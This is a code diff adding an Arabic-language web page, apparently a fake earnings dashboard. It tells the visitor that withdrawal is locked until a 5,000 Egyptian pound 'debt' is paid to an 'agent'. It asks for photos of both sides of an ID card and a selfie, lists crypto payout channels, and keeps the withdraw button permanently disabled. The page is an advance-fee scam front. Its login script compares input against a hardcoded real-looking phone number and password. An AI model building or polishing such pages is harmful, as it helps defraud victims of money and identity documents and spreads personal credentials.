@@ -651,4 +651,154 @@
                     <p class="balance-subtext">للسحب المباشر يجب:</p>
                     <ul style="list-style: none; margin-top: 15px;">
                         <li style="margin-bottom: 10px;"><i class="fas fa-check-circle" style="color: var(--success);"></i> تسديد المديونية بالكامل</li>
-                        <li style
+                        <li style="margin-bottom: 10px;"><i class="fas fa-check-circle" style="color: var(--success);"></i> إرفاق صورة البطاقة الشخصية (الوجهين)</li>
+                        <li><i class="fas fa-check-circle" style="color: var(--success);"></i> إرفاق صورة شخصية حديثة</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+        
+        <!-- قسم السحب -->
+        <div class="withdraw-section fade-in" style="animation-delay: 0.8s;">
+            <h2 class="section-title">السحب المباشر</h2>
+            
+            <div class="warning-box">
+                <div class="warning-header">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <h3>تنبيه هام</h3>
+                </div>
+                <p>يجب تسديد المديونية البالغة 5,000 جنيه مصري أولاً حتى تتمكن من سحب الأرباح. لقد حاول الوكيل التواصل معك ولم يتم الرد.</p>
+            </div>
+            
+            <div class="upload-area" id="uploadArea">
+                <i class="fas fa-cloud-upload-alt upload-icon"></i>
+                <h3>إرفاق المستندات المطلوبة</h3>
+                <p>لضمان السحب بدون أي مشاكل، يرجى إرفاق صورة بطاقة العميل من الجهتين وصورة شخصية حديثة</p>
+            </div>
+            
+            <div class="contact-agent">
+                <p class="contact-text">للتسديد يرجى التواصل مع الوكيل. سيتم فتح إمكانية السحب المباشر بعد إجراء عملية التسديد خلال ثوانٍ بسيطة.</p>
+            </div>
+            
+            <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-top: 20px;">
+                <button class="btn" id="withdrawBtn" disabled>
+                    <i class="fas fa-money-bill-wave"></i> السحب الآن
+                </button>
+            </div>
+            
+            <div class="crypto-methods">
+                <h3 class="crypto-title">طرق السحب المتاحة:</h3>
+                <div class="crypto-list">
+                    <div class="crypto-item"><i class="fas fa-wallet"></i> Binance (باينانس)</div>
+                    <div class="crypto-item"><i class="fas fa-coins"></i> USDT (تيثير)</div>
+                    <div class="crypto-item"><i class="fas fa-bitcoin"></i> BTC (بتكوين)</div>
+                    <div class="crypto-item"><i class="fas fa-exchange-alt"></i> TRX (ترون)</div>
+                    <div class="crypto-item"><i class="fas fa-money-bill-wave"></i> Payeer (باير)</div>
+                    <div class="crypto-item"><i class="fas fa-dollar-sign"></i> Perfect Money (برفكت ماني)</div>
+                    <div class="crypto-item"><i class="fas fa-piggy-bank"></i> Pi Network (باي نتورك)</div>
+                    <div class="crypto-item"><i class="fas fa-box"></i> Blockchain (بلوكشين)</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // بيانات تسجيل الدخول
+        const CORRECT_PHONE = "01034178100";
+        const CORRECT_PASSWORD = "mazn9090";
+        
+        // عناصر واجهة المستخدم
+        const loginOverlay = document.getElementById('loginOverlay');
+        const mainContent = document.getElementById('mainContent');
+        const loginForm = document.getElementById('loginForm');
+        const phoneInput = document.getElementById('phone');
+        const passwordInput = document.getElementById('password');
+        const togglePassword = document.getElementById('togglePassword');
+        const loginError = document.getElementById('loginError');
+        const uploadArea = document.getElementById('uploadArea');
+        const withdrawBtn = document.getElementById('withdrawBtn');
+        
+        // إظهار/إخفاء كلمة المرور
+        togglePassword.addEventListener('click', function() {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            this.innerHTML = type === 'password' ? '<i class="fas fa-eye"></i>' : '<i class="fas fa-eye-slash"></i>';
+        });
+        
+        // معالجة تسجيل الدخول
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phone = phoneInput.value.trim();
+            const password = passwordInput.value.trim();
+            
+            if (phone === CORRECT_PHONE && password === CORRECT_PASSWORD) {
+                // تسجيل الدخول ناجح
+                loginOverlay.style.display = 'none';
+                mainContent.classList.remove('hidden');
+            } else {
+                // تسجيل الدخول فاشل
+                loginError.style.display = 'block';
+                setTimeout(() => {
+                    loginError.style.display = 'none';
+                }, 3000);
+            }
+        });
+        
+        // تسجيل الخروج
+        function logout() {
+            loginOverlay.style.display = 'flex';
+            mainContent.classList.add('hidden');
+            phoneInput.value = '';
+            passwordInput.value = '';
+            passwordInput.setAttribute('type', 'password');
+            togglePassword.innerHTML = '<i class="fas fa-eye"></i>';
+        }
+        
+        // تأثيرات ظهور العناصر عند التمرير
+        document.addEventListener('DOMContentLoaded', function() {
+            const animatedElements = document.querySelectorAll('.fade-in');
+            
+            const observer = new IntersectionObserver((entries) => {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.style.opacity = 1;
+                        observer.unobserve(entry.target);
+                    }
+                });
+            }, {
+                threshold: 0.1
+            });
+            
+            animatedElements.forEach(element => {
+                element.style.opacity = 0;
+                element.style.transition = 'opacity 0.8s ease, transform 0.8s ease';
+                observer.observe(element);
+            });
+            
+            // تأثير الضبابية التفاعلي
+            const header = document.querySelector('header');
+            const cards = document.querySelectorAll('.card');
+            const profileCard = document.querySelector('.profile-card');
+            const withdrawSection = document.querySelector('.withdraw-section');
+            
+            document.addEventListener('mousemove', (e) => {
+                const x = e.clientX / window.innerWidth;
+                const y = e.clientY / window.innerHeight;
+                
+                cards.forEach(card => {
+                    card.style.transform = `translate(${x * 10 - 5}px, ${y * 10 - 5}px)`;
+                });
+                
+                header.style.transform = `translate(${x * 5 - 2.5}px, ${y * 5 - 2.5}px)`;
+                profileCard.style.transform = `translate(${x * 7 - 3.5}px, ${y * 7 - 3.5}px)`;
+                withdrawSection.style.transform = `translate(${x * 7 - 3.5}px, ${y * 7 - 3.5}px)`;
+            });
+            
+            // تعطيل منطقة التحميل
+            uploadArea.style.opacity = "0.5";
+            uploadArea.style.cursor = "not-allowed";
+        });
+    </script>
+</body>
+</html>
